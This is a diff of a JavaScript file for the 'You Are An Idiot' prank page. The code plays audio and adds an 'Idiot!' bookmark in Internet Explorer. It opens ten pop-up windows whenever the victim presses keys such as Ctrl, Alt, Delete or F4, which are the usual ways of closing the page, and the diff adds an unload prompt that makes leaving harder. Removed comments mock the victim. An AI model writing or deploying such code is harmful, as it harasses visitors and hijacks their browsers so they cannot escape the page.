@@ -1,4 +1,5 @@
-/* lol little jimmy's laptop after opening the site is like ahhhhhhhh*/
+
+/* [Oct 2021] Added to comply with strict browser policies. */
 document.addEventListener('click', musicPlay);
 
 function musicPlay() {
@@ -21,7 +22,7 @@ function musicPlay() {
 	document.removeEventListener('click', musicPlay);
 }
 
-var faudio = new Audio('youare.mp3') //plays audio
+var faudio = new Audio('youare.mp3')
 
 faudio.addEventListener('timeupdate', function() {
 	console.log('TimeUpdate invoked.');
@@ -32,12 +33,12 @@ faudio.addEventListener('timeupdate', function() {
     }
 }
 );
-
+/* [Oct 2021] End part. */
 
 function bookmark() {
 	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
-		var url = "lol.html"; //data url
-		var title = "Idiot!"; //changes display name
+		var url = "lol.html";
+		var title = "Idiot!";
 		
 		window.external.AddFavorite(url, title);
 	}
@@ -58,8 +59,8 @@ function openWindow(url) {
 }
 
 function proCreate() {	
-	for (var i = 0; i < 10; i++) { //opens 10 bouncy windows 
-		openWindow('lol.html'); 
+	for (var i = 0; i < 10; i++) {
+		openWindow('lol.html');
 	}
 }
 
@@ -108,7 +109,7 @@ window.onload = function () {
 	flagRun = 1;
 	
 	playBall();
-	bookmark(); // Internet Explorer only (stupid)
+	bookmark(); // Internet Explorer only (what a piece of shit)
 	
 	return true;
 }
@@ -128,13 +129,14 @@ window.onkeydown = function() {
 	var keyCode = event.keyCode;
 	
 	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
-		alert("You are an idiot!"); //wish i made this appear more
+		alert("You are an idiot!"); 
 		proCreate();
 	}
 	
 	return null;
 }
 
-
+window.onbeforeunload = function() {
+    return "Are you an idiot?";
 };
 /* [Oct 2021] End of amendments. */
